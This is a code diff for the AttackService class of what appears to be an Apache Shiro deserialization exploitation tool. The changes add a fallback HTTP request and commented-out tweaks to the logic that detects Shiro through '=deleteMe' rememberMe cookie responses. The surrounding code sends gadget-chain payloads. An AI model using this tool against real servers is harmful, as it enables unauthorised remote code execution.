@@ -5,6 +5,8 @@
 
 package com.summersec.attack.core;
 
+import cn.hutool.http.HttpRequest;
+import cn.hutool.http.Method;
 import com.summersec.attack.deser.frame.Shiro;
 import com.summersec.attack.deser.payloads.ObjectPayload;
 import com.summersec.attack.deser.plugins.servlet.MemBytes;
@@ -76,9 +78,13 @@ public class AttackService {
             } else {
                 result = HttpUtil.postHeaderByHttpRequest(this.url, "UTF-8", "", combineHeaders, this.timeout);
             }
+            if (result.isEmpty()){
+                result = cn.hutool.http.HttpUtil.createRequest(Method.valueOf(this.method),this.url).headerMap(combineHeaders,true).setFollowRedirects(false).execute().toString();
+            }
         } catch (Exception var5) {
             this.mainController.logTextArea.appendText(Utils.log(var5.getMessage()));
         }
+
 
         return result;
     }
@@ -184,6 +190,7 @@ public class AttackService {
             Object chainObject = gadgetPayload.getObject(template);
             rememberMe = shiro.sendpayload(chainObject, this.shiroKeyWord, spcShiroKey);
         } catch (Exception var9) {
+//            var9.printStackTrace();
             this.mainController.logTextArea.appendText(Utils.log(var9.getMessage()));
         }
 
@@ -219,6 +226,10 @@ public class AttackService {
             header.put("Cookie", this.shiroKeyWord + "=1");
             String result = this.headerHttpRequest(header);
             flag = result.contains("=deleteMe");
+//            if (!flag){
+//                flag = result.contains(shiroKeyWord);
+//                flag = true;
+//            }
             if (flag) {
                 this.mainController.logTextArea.appendText(Utils.log("存在shiro框架！"));
                 flag = true;
@@ -227,10 +238,16 @@ public class AttackService {
                 header1.put("Cookie", this.shiroKeyWord + "=" + AttackService.getRandomString(10));
                 String result1 = this.headerHttpRequest(header1);
                 flag = result1.contains("=deleteMe");
+//                if (!flag){
+//                    result1.contains(shiroKeyWord);
+//                    flag = true;
+//                }
                 if(flag){
                     this.mainController.logTextArea.appendText(Utils.log("存在shiro框架！"));
                     flag = true;
+
                 }else {
+
                     this.mainController.logTextArea.appendText(Utils.log("未发现shiro框架！"));
 
                 }
